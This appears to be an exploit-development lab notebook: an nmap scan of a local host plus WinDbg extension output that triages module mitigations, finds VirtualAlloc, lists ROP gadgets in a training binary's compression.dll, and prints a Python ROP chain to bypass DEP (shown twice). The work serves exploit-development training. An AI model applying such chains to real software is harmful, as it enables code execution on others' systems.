## NMAP

```bash
Nmap scan report for 192.168.1.114
Host is up, received arp-response (0.012s latency).
Scanned at 2026-07-26 15:16:12 EDT for 29s
Not shown: 65522 closed tcp ports (reset)
PORT      STATE SERVICE       REASON
135/tcp   open  msrpc         syn-ack ttl 128
139/tcp   open  netbios-ssn   syn-ack ttl 128
445/tcp   open  microsoft-ds  syn-ack ttl 128
3389/tcp  open  ms-wbt-server syn-ack ttl 128
5040/tcp  open  unknown       syn-ack ttl 128
9999/tcp  open  abyss         syn-ack ttl 128
49664/tcp open  unknown       syn-ack ttl 128
49665/tcp open  unknown       syn-ack ttl 128
49666/tcp open  unknown       syn-ack ttl 128
49667/tcp open  unknown       syn-ack ttl 128
49668/tcp open  unknown       syn-ack ttl 128
49669/tcp open  unknown       syn-ack ttl 128
49670/tcp open  unknown       syn-ack ttl 128
MAC Address: 46:53:4F:4D:F5:F5 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 31.15 seconds
           Raw packets sent: 66438 (2.923MB) | Rcvd: 65536 (2.621MB)
```

Port 9999 open


### Module States

```text
0:000> dx @$osed().modules()

=== Modules ===
Module                                                                                       Base                Size        ASLR      DEP       SafeSEH   System  
-------------------------------------------------------------------------------------------  ------------------  ----------  --------  --------  --------  --------
C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\service.exe      0x00400000          0x2E000     disabled  enabled   disabled  no      
C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\helper.dll       0x5ED80000          0x15000     enabled   enabled   enabled   no      
C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\compression.dll  0x61500000          0x1C000     disabled  enabled   enabled   no      
C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\crypto.dll       0x63000000          0x15000     disabled  enabled   enabled   no      
C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\network.dll      0x64000000          0x16000     disabled  enabled   enabled   no      
C:\Windows\System32\KERNELBASE.dll                                                           0x75010000          0x237000    enabled   enabled   enabled   yes     
C:\Windows\System32\KERNEL32.DLL                                                             0x75510000          0x9D000     enabled   enabled   enabled   yes     
C:\Windows\System32\RPCRT4.dll                                                               0x757D0000          0xC0000     enabled   enabled   enabled   yes     
C:\Windows\System32\WS2_32.dll                                                               0x76770000          0x63000     enabled   enabled   enabled   yes     
ntdll.dll                                                                                    0x76E80000          0x19F000    enabled   enabled   enabled   no      
Why this matters for exploitation: Mitigation triage identifies practical modules for reliable exploitation paths.
@$osed().modules() : true
```

## Searching for VirtualProtect or VirtualAlloc

```text
0:000> dx @$osed().sc.iat_find("VirtualAlloc")

=== sc.iat_find ===
[-] No IAT entries matched "VirtualAlloc".
Error: Operation aborted (0x80004004)
0:000> dx @$osed().sc.iat_ptr("compression", "Virtual")

=== sc.iat_ptr ===
slot        target      module        symbol        status  note
----------  ----------  ------------  ------------  ------  ----
0x61512010  0x75535680  KERNEL32.DLL  VirtualAlloc  ok          
@$osed().sc.iat_ptr("compression", "Virtual")                 : sc.iat_ptr: 1 row
    title            : sc.iat_ptr
    rows             : sc.iat_ptr: 1 row; expand rows[N] for details
    length           : 0x1

```


```text
0:000> dx @$osed().rop.capabilities()

=== ROP Capabilities ===
Kind           Register  Target  Count
-------------  --------  ------  -----
LOAD_REGISTER  eax               1    
LOAD_REGISTER  ebp               7    
LOAD_REGISTER  ebx               5    
LOAD_REGISTER  ecx               5    
LOAD_REGISTER  edi               5    
LOAD_REGISTER  edx               1    
LOAD_REGISTER  esi               6    
STACK_PIVOT                      1    
@$osed().rop.capabilities()                 : ROP Capabilities: 8 rows
    title            : ROP Capabilities
    rows             : ROP Capabilities: 8 rows; expand rows[N] for details
    length           : 0x8
0:000> dx @$osed().rop.query("capability", "LOAD_REGISTER")

=== ROP Query ===
Address     Module                                                                                       Score  Terminator  Reads             Writes                      MemoryReads         MemoryWrites  StackDelta       Capabilities                  Sequence               
----------  -------------------------------------------------------------------------------------------  -----  ----------  ----------------  --------------------------  ------------------  ------------  ---------------  ----------------------------  -----------------------
0x61501553  C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\compression.dll  85     RETURN      exact(exact=esp)  exact(exact=ecx, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER                 pop ecx ; ret          
0x6150E13E  C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\compression.dll  85     RETURN      exact(exact=esp)  exact(exact=edx, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER                 pop edx ; ret          
0x6150121E  C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\compression.dll  85     RETURN      exact(exact=esp)  exact(exact=ebx, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER                 pop ebx ; ret          
0x61501B7C  C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\compression.dll  85     RETURN      exact(exact=esp)  exact(exact=ebp, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER                 pop ebp ; ret          
0x6150134E  C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\compression.dll  85     RETURN      exact(exact=esp)  exact(exact=esi, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER                 pop esi ; ret          
0x61502F95  C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\compression.dll  85     RETURN      exact(exact=esp)  exact(exact=edi, esp)       exact(exact=[esp])  none          exact(exact=8)   LOAD_REGISTER                 pop edi ; ret          
0x61506151  C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\compression.dll  55     RETURN      exact(exact=esp)  exact(exact=eax, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_REGISTER  pop eax ; pop ebp ; ret
0x6150583B  C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\compression.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, esp)       exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_REGISTER  pop ecx ; pop ecx ; ret
0x61501C4A  C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\compression.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_REGISTER  pop ecx ; pop ebp ; ret
0x61504062  C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\compression.dll  55     RETURN      exact(exact=esp)  exact(exact=ecx, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_REGISTER  pop ecx ; pop esi ; ret
0x615028FB  C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\compression.dll  55     RETURN      exact(exact=esp)  exact(exact=ebx, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_REGISTER  pop ebx ; pop ebp ; ret
0x615012B0  C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\compression.dll  55     RETURN      exact(exact=esp)  exact(exact=ebp, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_REGISTER  pop ebp ; pop ebx ; ret
0x61501F85  C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\compression.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_REGISTER  pop esi ; pop ebx ; ret
0x61501B7B  C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\compression.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_REGISTER  pop esi ; pop ebp ; ret
0x61502F94  C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\compression.dll  55     RETURN      exact(exact=esp)  exact(exact=esi, edi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_REGISTER  pop esi ; pop edi ; ret
0x6150241A  C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\compression.dll  55     RETURN      exact(exact=esp)  exact(exact=edi, ebx, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_REGISTER  pop edi ; pop ebx ; ret
0x61502C5E  C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\compression.dll  55     RETURN      exact(exact=esp)  exact(exact=edi, ebp, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_REGISTER  pop edi ; pop ebp ; ret
0x61502ADF  C:\Users\dooley\Documents\OSED-Toolkit\Learning\Win32_X86\07_dep_bypass\bin\compression.dll  55     RETURN      exact(exact=esp)  exact(exact=edi, esi, esp)  exact(exact=[esp])  none          exact(exact=12)  LOAD_REGISTER, LOAD_REGISTER  pop edi ; pop esi ; ret
@$osed().rop.query("capability", "LOAD_REGISTER")                 : ROP Query: 18 rows
    title            : ROP Query
    rows             : ROP Query: 18 rows; expand rows[N] for details
    length           : 0x12
0:000> dx @$osed().rop.chain_va(0x75535680)

=== ROP Chain — VirtualAlloc (PUSHAD) ===
[+] Mode: direct | Resolved gadgets: edi, esi, ebp, ebx, edx, ecx | Stack: 48 bytes
[+] Define before use: RETURN_ADDR, LP_ADDRESS
from struct import pack
rop = b""
rop += pack("<I", 0x61502F95)  # pop edi ; ret
rop += pack("<I", 0x75535680)  # edi = 0x75535680 (VirtualAlloc (RET dispatches here))
rop += pack("<I", 0x6150134E)  # pop esi ; ret
rop += pack("<I", RETURN_ADDR)  # esi = RETURN_ADDR (return address after VirtualAlloc (e.g. push eax ; ret))
rop += pack("<I", 0x61501B7C)  # pop ebp ; ret
rop += pack("<I", LP_ADDRESS)  # ebp = LP_ADDRESS (lpAddress (NULL = OS chooses, or specific address))
rop += pack("<I", 0x6150121E)  # pop ebx ; ret
rop += pack("<I", 0x00001000)  # ebx = 0x00001000 (flAllocationType = 0x00001000 (MEM_COMMIT))
rop += pack("<I", 0x6150E13E)  # pop edx ; ret
rop += pack("<I", 0x00000040)  # edx = 0x00000040 (flProtect = 0x00000040 (PAGE_EXECUTE_READWRITE))
rop += pack("<I", 0x61501553)  # pop ecx ; ret
rop += pack("<I", 0x90909090)  # ecx = 0x90909090 (unused by VirtualAlloc (junk))
[!] eax: only multi-pop or address-less load gadgets available
[!] pushad: no pushad ; ret gadget in corpus
[!] direct PUSHAD VirtualAlloc uses saved ESP as dwSize; verify this size is acceptable or use a different chain shape.

=== ROP VirtualAlloc Chain ===
Word         Meaning                                                                    
-----------  ---------------------------------------------------------------------------
0x61502F95   pop edi ; ret                                                              
0x75535680   edi = 0x75535680 (VirtualAlloc (RET dispatches here))                      
0x6150134E   pop esi ; ret                                                              
RETURN_ADDR  esi = RETURN_ADDR (return address after VirtualAlloc (e.g. push eax ; ret))
0x61501B7C   pop ebp ; ret                                                              
LP_ADDRESS   ebp = LP_ADDRESS (lpAddress (NULL = OS chooses, or specific address))      
0x6150121E   pop ebx ; ret                                                              
0x00001000   ebx = 0x00001000 (flAllocationType = 0x00001000 (MEM_COMMIT))              
0x6150E13E   pop edx ; ret                                                              
0x00000040   edx = 0x00000040 (flProtect = 0x00000040 (PAGE_EXECUTE_READWRITE))         
0x61501553   pop ecx ; ret                                                              
0x90909090   ecx = 0x90909090 (unused by VirtualAlloc (junk))                           
@$osed().rop.chain_va(0x75535680)                 : ROP VirtualAlloc Chain: 12 rows
    title            : ROP VirtualAlloc Chain
    rows             : ROP VirtualAlloc Chain: 12 rows; expand rows[N] for details
    length           : 0xc

```

```text
0:000> dx @$osed().rop.scan_live("compression", "00 0A 0D")

=== Live ROP Corpus Loaded ===
[+] Gadgets: 23 (from 94 live hits)
[+] Capabilities: 8
[+] Rejected by bad chars: 3
@$osed().rop.scan_live("compression", "00 0A 0D")                 : Live ROP Corpus Loaded: 1 row
    title            : Live ROP Corpus Loaded
    rows             : Live ROP Corpus Loaded: 1 row; expand rows[N] for details
    length           : 0x1
0:000> dx @$osed().rop.capabilities()

=== ROP Capabilities ===
Kind           Register  Target  Count
-------------  --------  ------  -----
LOAD_REGISTER  eax               1    
LOAD_REGISTER  ebp               7    
LOAD_REGISTER  ebx               5    
LOAD_REGISTER  ecx               5    
LOAD_REGISTER  edi               5    
LOAD_REGISTER  edx               1    
LOAD_REGISTER  esi               6    
STACK_PIVOT                      1    
@$osed().rop.capabilities()                 : ROP Capabilities: 8 rows
    title            : ROP Capabilities
    rows             : ROP Capabilities: 8 rows; expand rows[N] for details
    length           : 0x8
0:000> dx @$osed().rop.chain_va(0x75535680)

=== ROP Chain — VirtualAlloc (PUSHAD) ===
[+] Mode: direct | Resolved gadgets: edi, esi, ebp, ebx, edx, ecx | Stack: 48 bytes
[+] Define before use: RETURN_ADDR, LP_ADDRESS
from struct import pack
rop = b""
rop += pack("<I", 0x61502F95)  # pop edi ; ret
rop += pack("<I", 0x75535680)  # edi = 0x75535680 (VirtualAlloc (RET dispatches here))
rop += pack("<I", 0x6150134E)  # pop esi ; ret
rop += pack("<I", RETURN_ADDR)  # esi = RETURN_ADDR (return address after VirtualAlloc (e.g. push eax ; ret))
rop += pack("<I", 0x61501B7C)  # pop ebp ; ret
rop += pack("<I", LP_ADDRESS)  # ebp = LP_ADDRESS (lpAddress (NULL = OS chooses, or specific address))
rop += pack("<I", 0x6150121E)  # pop ebx ; ret
rop += pack("<I", 0x00001000)  # ebx = 0x00001000 (flAllocationType = 0x00001000 (MEM_COMMIT))
rop += pack("<I", 0x6150E13E)  # pop edx ; ret
rop += pack("<I", 0x00000040)  # edx = 0x00000040 (flProtect = 0x00000040 (PAGE_EXECUTE_READWRITE))
rop += pack("<I", 0x61501553)  # pop ecx ; ret
rop += pack("<I", 0x90909090)  # ecx = 0x90909090 (unused by VirtualAlloc (junk))
[!] eax: only multi-pop or address-less load gadgets available
[!] pushad: no pushad ; ret gadget in corpus
[!] direct PUSHAD VirtualAlloc uses saved ESP as dwSize; verify this size is acceptable or use a different chain shape.

=== ROP VirtualAlloc Chain ===
Word         Meaning                                                                    
-----------  ---------------------------------------------------------------------------
0x61502F95   pop edi ; ret                                                              
0x75535680   edi = 0x75535680 (VirtualAlloc (RET dispatches here))                      
0x6150134E   pop esi ; ret                                                              
RETURN_ADDR  esi = RETURN_ADDR (return address after VirtualAlloc (e.g. push eax ; ret))
0x61501B7C   pop ebp ; ret                                                              
LP_ADDRESS   ebp = LP_ADDRESS (lpAddress (NULL = OS chooses, or specific address))      
0x6150121E   pop ebx ; ret                                                              
0x00001000   ebx = 0x00001000 (flAllocationType = 0x00001000 (MEM_COMMIT))              
0x6150E13E   pop edx ; ret                                                              
0x00000040   edx = 0x00000040 (flProtect = 0x00000040 (PAGE_EXECUTE_READWRITE))         
0x61501553   pop ecx ; ret                                                              
0x90909090   ecx = 0x90909090 (unused by VirtualAlloc (junk))                           
@$osed().rop.chain_va(0x75535680)                 : ROP VirtualAlloc Chain: 12 rows
    title            : ROP VirtualAlloc Chain
    rows             : ROP VirtualAlloc Chain: 12 rows; expand rows[N] for details
    length           : 0xc
```

